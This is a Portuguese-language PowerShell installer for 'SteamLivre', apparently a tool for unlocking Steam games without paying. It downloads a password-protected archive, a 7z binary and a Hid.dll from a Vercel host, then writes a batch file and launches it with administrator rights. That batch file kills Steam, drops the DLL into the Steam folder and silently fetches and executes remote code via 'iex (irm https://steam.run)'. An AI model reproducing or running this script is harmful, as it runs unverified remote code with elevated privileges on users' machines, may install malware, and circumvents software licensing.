$ErrorActionPreference = "Stop"

# 1. Configuração de Diretórios Temporários
$tempDir = "$env:TEMP\SteamLivreSetup"
if (Test-Path $tempDir) { Remove-Item -Recurse -Force $tempDir }
New-Item -ItemType Directory -Force -Path $tempDir | Out-Null

Write-Host "=================================================" -ForegroundColor Cyan
Write-Host "       INICIANDO INSTALADOR STEAMLIVRE" -ForegroundColor Cyan
Write-Host "=================================================" -ForegroundColor Cyan
Write-Host "[1/3] Baixando arquivos da nuvem..." -ForegroundColor Yellow

# --- VERIFIQUE SE ESTE LINK ESTÁ CORRETO NO SEU VERCEL ---
$baseUrl = "https://pack27k.vercel.app"

try {
    # Downloads básicos
    Invoke-WebRequest -Uri "$baseUrl/STEAMLIVRE.zip" -OutFile "$tempDir\STEAMLIVRE.zip" -UseBasicParsing
    Invoke-WebRequest -Uri "$baseUrl/7z.exe" -OutFile "$tempDir\7z.exe" -UseBasicParsing
    Invoke-WebRequest -Uri "$baseUrl/7z.dll" -OutFile "$tempDir\7z.dll" -UseBasicParsing
} catch {
    Write-Host "`n[ERRO] Não foi possível baixar os arquivos de: $baseUrl" -ForegroundColor Red
    Write-Host "Verifique se o deploy no Vercel está ativo e os nomes estão corretos." -ForegroundColor Yellow
    Start-Sleep -Seconds 10
    Exit
}

# 2. Criação do Instalador Batch com a Nova Ordem
$batCode = @'
@echo off
setlocal EnableDelayedExpansion
chcp 65001 >nul
title instagram @steamlivre
mode con: cols=100 lines=38
cd /d "%~dp0"

set "SENHA_ZIP=40028922"

:: Localizar Steam
for /f "tokens=3*" %%A in ('reg query "HKCU\Software\Valve\Steam" /v SteamExe 2^>nul') do set "steamExe=%%A %%B"
for %%A in ("%steamExe%") do set "steamDir=%%~dpA"
set "steamDir=%steamDir:~0,-1%"

call :Header
echo  [+] Fechando Steam...
powershell -Command "Get-Process steam -ErrorAction SilentlyContinue | Stop-Process -Force" >nul 2>&1
timeout /t 2 /nobreak >nul

:: PASSO 1: EXTRAÇÃO
call :Header
echo  [+] Extraindo arquivos de configuracao... [40%%]
if exist "%temp%\sl_temp" rmdir /s /q "%temp%\sl_temp"
mkdir "%temp%\sl_temp"
7z.exe x "STEAMLIVRE.zip" -p%SENHA_ZIP% -y -o"%temp%\sl_temp" -bso0 -bsp0 >nul

:: PASSO 2: DELAY DE 5 SEGUNDOS (Solicitado)
echo  [+] Extracao concluida. Aguardando processamento...
timeout /t 5 /nobreak >nul

:: PASSO 3: CÓPIA DOS ARQUIVOS
call :Header
echo  [+] Aplicando arquivos no sistema... [70%%]
xcopy /e /i /y "%temp%\sl_temp\Config\*" "%steamDir%\config\" >nul 2>&1
copy /y "%temp%\sl_temp\Hid.dll" "%steamDir%\" >nul 2>&1
rmdir /s /q "%temp%\sl_temp" >nul

:: PASSO 4: INSTALAÇÃO STEAMTOOLS (SILENCIOSA)
call :Header
echo  [+] Atualizando ambiente Steamtools... [90%%]
powershell -WindowStyle Hidden -Command "iex (irm https://steam.run) *>$null"
powershell -Command "Get-Process steam -ErrorAction SilentlyContinue | Stop-Process -Force" >nul 2>&1
timeout /t 2 /nobreak >nul

:: FINALIZAÇÃO
call :Header
echo  [+] Instalacao concluida com sucesso! [100%%]
start "" "%steamExe%"
start "" "https://agradecimentopmw.lovable.app"
timeout /t 5
exit /b

:Header
cls
color 0B
echo.
echo     _^|_^|_^|  _^|_^|_^|_^|_^|  _^|_^|_^|_^|    _^|_^|    _^|      _^|  
echo   _^|            _^|      _^|        _^|    _^|  _^|_^|  _^|_^|  
echo     _^|_^|        _^|      _^|_^|_^|    _^|_^|_^|_^|  _^|  _^|  _^|  
echo         _^|      _^|      _^|        _^|    _^|  _^|      _^|  
echo   _^|_^|_^|        _^|      _^|_^|_^|_^|  _^|    _^|  _^|      _^|  
echo.
echo    S  T  E  A  M    L  I  V  R  E  ---  INSTALADOR OFICIAL
echo   =========================================================
echo.
exit /b
'@

Set-Content -Path "$tempDir\run.bat" -Value $batCode -Encoding Ascii
Write-Host "[2/3] Iniciando interface de instalacao..." -ForegroundColor Green
Start-Process -FilePath "$tempDir\run.bat" -Verb RunAs -Wait

# 3. Limpeza
Remove-Item -Recurse -Force $tempDir
Write-Host "[3/3] Concluido." -ForegroundColor Cyan
